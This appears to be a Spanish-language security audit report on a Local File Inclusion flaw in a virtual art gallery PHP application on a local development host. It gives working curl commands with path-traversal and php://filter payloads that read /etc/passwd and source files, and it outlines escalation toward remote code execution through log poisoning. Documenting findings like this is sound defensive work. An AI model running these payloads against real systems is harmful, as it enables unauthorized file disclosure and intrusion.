# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-27T06:17:59Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo
-----------------
Se encontraron y explotaron vulnerabilidades de Local File Inclusion (LFI) en el parámetro "page" de /gallery.php. Se logró leer ficheros sensibles de la aplicación y del sistema (por ejemplo /etc/passwd). Impacto: divulgación de información sensible y posible escalada posterior mediante técnicas adicionales (log poisoning, lectura de /proc/self/environ, extracción de claves si existen en rutas accesibles).

Detalles técnicos
-----------------
URL objetivo y parámetro vulnerable:
- http://web.dev.local:8081/gallery.php?page=<valor>

Herramientas usadas (Kali/MCP):
- gobuster (enumeración)
- dirb (enumeración)
- curl (probes manuales desde Kali MCP)

Comandos exactos ejecutados (reconocimiento y explotación):
1) Enumeración (ejemplo gobuster):
- gobuster dir -u http://web.dev.local:8081 -w /usr/share/wordlists/dirb/common.txt

2) Pruebas LFI y explotación (curl probes):
- curl -i 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl -i 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd'
- curl -i 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=pages/../index.php'

Payloads que permitieron descubrir ficheros:
- ../../../../../../etc/passwd
- php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
- php://filter/read=convert.base64-encode/resource=pages/../index.php

Evidencia y resultados (resumen):
- Al solicitar gallery.php?page=../../../../../../etc/passwd la respuesta HTTP incluyó el contenido de /etc/passwd embebido en la sección principal de la página (se muestran usuarios como root, www-data, etc.).
- Usando php://filter con base64 se obtuvo una versión codificada en base64 del contenido de /etc/passwd (útil para evitar alteraciones en el render HTML); el servidor también devolvió base64 del index.php al apuntar al recurso relativo.

Salida relevante (extracto):
- Contenido leído de /etc/passwd (extracto):
  root:x:0:0:root:/root:/bin/bash
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

- Base64-decoded sample (index.php) fue devuelto al usar php://filter, confirmando lectura de ficheros de la aplicación.

Explotación adicional intentada
------------------------------
- Se intentó usar wrappers php://filter para leer ficheros de la app (index.php) y ficheros de sistema. Éxito: lectura de /etc/passwd y de index.php vía base64.
- No se realizó escalada a RCE en esta iteración; pasos siguientes recomendados incluyen log poisoning mediante subida de archivos o manipulación de cabeceras que se escriban en logs accesibles, lectura de /proc/self/environ y búsqueda de claves privadas en rutas accesibles. Estas acciones pueden permitir ejecución remota o extracción de credenciales si son accesibles.

Impacto
-------
- VULN: Divulgación de información sensible (usuarios del sistema, rutas, potenciales credenciales en otros ficheros).
- POSIBLE ESCALADA: Si existen claves privadas o credenciales en rutas accesibles, pueden ser extraídas; con log poisoning es posible intentar RCE.

Recomendaciones
---------------
1) Validar y sanear el parámetro "page" (lista blanca de vistas permitidas) en lugar de incluir ficheros directamente desde entrada del usuario.
2) Evitar incluir archivos directamente desde parámetros sin normalización y comprobación de rutas. Usar rutas mapeadas internamente o IDs.
3) Deshabilitar wrappers peligrosos o utilizar open_basedir y otras restricciones de PHP para limitar accesos a rutas.
4) Revisar permisos de ficheros y usuarios (evitar almacenar claves privadas o ficheros sensibles con permisos accesibles por el usuario del proceso web).
5) Auditar logs y comprobar si hay evidencia de acceso no autorizado; rotar credenciales si procede.

Comandos exactos y payloads listos para reproducción
--------------------------------------------------
- curl -i 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl -i 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd'
- curl -i 'http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=pages/../index.php'

Anexos
------
- Fecha de ejecución: 2026-04-27T06:22:14Z (comprobaciones en tiempo real)
- Servidor: Apache/2.4.65 (Debian), PHP/8.1.33

Fin del informe.
